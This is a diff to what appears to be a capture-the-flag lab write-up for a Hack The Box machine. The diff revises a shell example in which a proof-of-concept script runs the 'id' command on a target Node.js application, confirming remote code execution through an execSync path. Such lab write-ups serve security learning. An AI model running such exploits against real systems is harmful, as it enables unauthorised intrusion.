@@ -915,10 +915,8 @@ With the PoC acquired, execution context was established before attempting anyth
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
-└─$ python3 poc.py http://TARGET_IP:3000/ id
-500
-0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
-1:E{"digest":"uid=999(node) gid=988(node) groups=988(node)"}
+└─$ python3 poc.py "id"                        
+uid=999(node) gid=988(node) groups=988(node)
 ```
 
 The application was running as `uid=999(node)` — a low-privilege service account, as expected for a containerized Node.js deployment. Crucially, this confirmed the `execSync` exfiltration path was fully operational and command output was being returned cleanly inside the `digest` field.
